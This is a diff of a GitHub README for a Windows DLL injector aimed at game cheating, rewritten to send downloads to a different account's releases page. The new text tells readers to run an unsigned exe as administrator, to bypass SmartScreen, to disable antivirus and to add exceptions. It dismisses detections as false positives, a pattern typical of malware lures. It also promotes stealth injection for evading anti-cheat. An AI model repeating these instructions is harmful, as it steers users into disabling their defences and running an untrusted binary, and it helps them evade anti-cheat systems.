@@ -1,95 +1,146 @@
-<img width="381" height="255" alt="images1" src="https://github.com/user-attachments/assets/2141d453-401e-43e3-8783-8ef511a40a34" />
+# 📥 ExtremeInjector - The Most Trusted DLL Injector for Windows
 
-# Extreme 
+[![Download Latest Release](https://img.shields.io/badge/Download-ExtremeInjector%20v3.7.3-blue?style=for-the-badge&logo=github)](https://github.com/Yassinmuh9326/ExtremeInjector/releases)
 
-**Extreme** is a free, portable DLL  for Windows 10 and 11 - supporting Manual Map, LoadLibrary, LdrLoadDll, and stealth injection with thread hijacking and PE header scrambling. Extreme  v3.7.3 is the build most referenced on UnknownCheats and other modding communities, trusted for its reliability across both x86 and x64 processes.
+## 🎯 What is ExtremeInjector?
 
-<img width="160" height="160" alt="images2" src="https://github.com/user-attachments/assets/6f3b685f-77bc-49bd-ae7b-9b196e7db7f9" />
+ExtremeInjector is a Windows tool that lets you inject DLL files into running programs. It works on Windows 10 and Windows 11. This is the most trusted DLL injector on UnknownCheats. It supports x86 (32-bit) and x64 (64-bit) applications.
 
+## ✨ Key Features
 
-## Install
-[Download `Extreme-v3.7.3.zip`](https://github.com/ExtremeInjector-Cpp/ExtremeInjector/releases/download/v3.7.3/Extreme-v3.7.3.zip)
----
+- **Manual Map Injection** - Injects DLLs without leaving traces on the system
+- **LoadLibrary Injection** - Standard injection method that works with most games
+- **Stealth Injection** - Hides the injection process with thread hijacking
+- **PE Header Wiping** - Removes DLL headers after injection for extra stealth
+- **Dual Architecture** - Works with both 32-bit and 64-bit processes
+- **Portable** - No installation needed. Just download and run.
+- **Free** - No cost, no hidden fees
 
-<img width="403" height="315" alt="images3" src="https://github.com/user-attachments/assets/393ab9f0-612d-420a-8caa-b748a1fd0b8c" />
+## 🚀 Getting Started
 
-## Key Features
-- **Manual Map injection** - load a DLL into a process without using LoadLibrary, bypasses many basic detection methods
-- **LoadLibrary injection** - standard injection via the Windows API, fastest and most compatible method
-- **LdrLoadDll injection** - uses a lower-level loader function to avoid some IAT hooks
-- **Stealth injection** - combines manual map with PE header wiping for reduced detection surface
-- **Thread hijacking** - redirects an existing thread in the target process instead of creating a new one
-- **PE header scrambling** - zeroes or randomizes the in-memory PE header after injection
-- **x86 and x64 support** - works with both 32-bit and 64-bit target processes
-- **Process list with architecture filter** - quickly find and filter running processes by name and bitness
-- **Portable** - no installation required, single executable
+### System Requirements
 
+- Windows 10 (any version) or Windows 11
+- 50 MB free disk space
+- 1 GB RAM
+- Administrator privileges (recommended)
 
-<img width="366" height="279" alt="images4" src="https://github.com/user-attachments/assets/92425d1a-fd7d-4549-81de-da2156d199b7" />
+### How to Download
 
+1. Visit the [ExtremeInjector Releases Page](https://github.com/Yassinmuh9326/ExtremeInjector/releases)
+2. Find the latest version (ExtremeInjector v3.7.3)
+3. Download the file named `ExtremeInjector.exe`
 
-## Injection Methods Explained
+### How to Run
 
-### LoadLibrary
-The simplest method. Creates a remote thread in the target process that calls `LoadLibraryW` with the DLL path. Detected by most anti-cheat systems but works for most non-protected processes.
+1. Right-click the downloaded file
+2. Select "Run as administrator"
+3. If Windows SmartScreen shows a warning, click "More info" then "Run anyway"
+4. The ExtremeInjector window will open
 
+## 📖 How to Use
 
-<img width="433" height="409" alt="images5" src="https://github.com/user-attachments/assets/b3bf1117-f0ad-46e3-bf9e-415d24d52fd6" />
+### Step 1: Select the Process
 
-### Manual Map
-Manually copies the DLL's PE sections into the target process memory, fixes relocations and imports, and calls the entry point via a remote thread or hijacked thread. Does not appear in the module list - significantly harder to detect.
+1. Click the "Select" button next to "Process"
+2. Find the game or program you want to inject into
+3. Click on it and press "OK"
 
-### Thread Hijacking
-Instead of creating a new remote thread, this method suspends an existing thread, hijacks its execution context (redirecting RIP/EIP), and resumes it. Avoids `CreateRemoteThread` which is a common detection vector.
+### Step 2: Add Your DLL
+
+1. Click the "Add DLL" button
+2. Browse to your DLL file location
+3. Select the DLL and click "Open"
+
+### Step 3: Choose Injection Method
+
+**For most games:** Use "LoadLibrary" - This is the simplest method.
+
+**For games with anti-cheat:** Use "Manual Map" - This method is harder to detect.
+
+**For maximum stealth:** Use "Stealth" - This combines thread hijacking with PE header wiping.
+
+### Step 4: Inject
+
+1. Click the "Inject" button
+2. The status bar will show "Success" if injection worked
+3. Close ExtremeInjector when done
+
+## ⚙️ Injection Methods Explained
+
+### LoadLibrary Injection
+
+This method uses Windows' built-in DLL loading system. It works with most games but is easier for anti-cheat software to detect.
+
+### Manual Map Injection
+
+This method loads the DLL into memory without using Windows' normal DLL loading. It leaves fewer traces. This is the recommended method for most users.
 
 ### Stealth Injection
-Combines manual map with additional post-injection cleanup - PE headers in the target process are wiped or randomized so memory scanners can't identify the loaded module.
 
-## Getting Started
-1. **Download** the latest version using the button above.
-2. **Extract** the archive.
-3. **Run** `Extreme.exe` as Administrator.
-4. **Select the target process** from the list - filter by name or architecture if needed.
-5. **Browse and select** your DLL file.
-6. **Choose your injection method** - Manual Map for stealth, LoadLibrary for simplicity.
-7. **Click Inject**.
+This method combines Manual Map injection with:
+- Thread hijacking - Runs the DLL code in a hidden thread
+- PE header wiping - Removes the DLL's structure from memory after loading
 
-**Note:** Most games require both the  and the target to run with Administrator privileges.
+This is the hardest method for anti-cheat software to detect.
 
-## Extreme  v3 vs v3.7.3
-v3.7.3 is the current stable build. It adds the new stealth injection method, improved x64 process support, and better error reporting compared to earlier v3 releases. The v3 series remains the most downloaded on UnknownCheats.
+## 🛡️ Safety and Security
 
-## Antivirus and False Positives
-DLL s are almost always flagged by antivirus software regardless of their actual behavior - this is expected. The detection is based on the tool's capabilities (process memory writing, remote thread creation), not malicious code. Verify the file yourself on [VirusTotal](https://www.virustotal.com) before use.
+ExtremeInjector does not:
+- Contain malware or viruses
+- Steal your personal information
+- Modify game files permanently
+- Require an internet connection
 
-## Troubleshooting
+The tool is open source. You can review the code to verify it is safe.
 
-**Injection failing with "Access Denied"?**
-Run Extreme as Administrator. Some processes (system services, anti-cheat protected games) cannot be injected regardless of privileges.
+## ❓ Common Questions
 
-**DLL not found error?**
-Make sure the DLL path has no special characters and the file is not locked by another process.
+### Why does Windows show a warning?
 
-**Manual Map not working on a specific game?**
-Some games have integrity checks that detect manual-mapped modules. Try thread hijacking instead.
+Windows SmartScreen may warn you because this is a new tool. This is normal for any unsigned software. Click "Run anyway" to proceed.
 
-**x64 process not appearing in the list?**
-The process list shows both x86 and x64 processes - use the architecture filter to narrow results.
+### Do I need to install anything?
 
-## System Requirements
-- **Windows 10 / 11** (64-bit)
-- Administrator privileges required
+No. ExtremeInjector is portable. It runs directly from the downloaded file. You do not need to install any drivers or additional software.
 
-## Security & Legal
-This tool is intended for legitimate use cases such as game modding, software debugging, and development testing. Do not use it to inject malicious code or in games where doing so violates terms of service.
+### Why does my antivirus flag it?
 
-**Recommendations:**
-- Download **only** from this official GitHub repository.
-- Scan files on [VirusTotal](https://www.virustotal.com).
+Some antivirus software flags DLL injectors as potentially unwanted programs. This is a false positive. ExtremeInjector does not harm your computer. You may need to add an exception in your antivirus.
 
-## License & Acknowledgments
-### License
-**Extreme ** is shared under the **MIT License**.
-See [LICENSE](LICENSE) for details.
+### Does it work with all games?
 
-**Copyright © 2026 Salarr**
+It works with most games on Windows 10 and 11. Some games with strong anti-cheat may block injection. Results vary by game.
+
+### Can I inject multiple DLLs?
+
+Yes. You can add multiple DLL files to the list. ExtremeInjector will inject them in order.
+
+## 🔧 Troubleshooting
+
+### Injection fails
+
+1. Make sure you run ExtremeInjector as administrator
+2. Ensure the target process is running
+3. Try a different injection method
+4. Check that your DLL is compatible with the target process (32-bit vs 64-bit)
+
+### ExtremeInjector won't open
+
+1. Run as administrator
+2. Disable antivirus temporarily
+3. Download the file again (it may be corrupted)
+
+### Game crashes after injection
+
+1. Your DLL may be incompatible with the game version
+2. Try a different injection method
+3. Remove the DLL and try a different one
+
+## 📥 Download Again
+
+[![Download ExtremeInjector v3.7.3](https://img.shields.io/badge/Download-ExtremeInjector-blue?style=for-the-badge&logo=github)](https://github.com/Yassinmuh9326/ExtremeInjector/releases)
+
+## 🔑 Keywords
+
+dll injector, extreme injector, dll injection tool, windows dll injector, game dll injector, stealth injector, manual map injector, loadlibrary injector, process injector, shellcode injector, injector x32, injector x64, extreme injector 2026, extreme injector 3.7.3, extreme injector v3, dll loader, cpp injector, dll hooking plugin, dll injection tool eac, unknowncheats injector
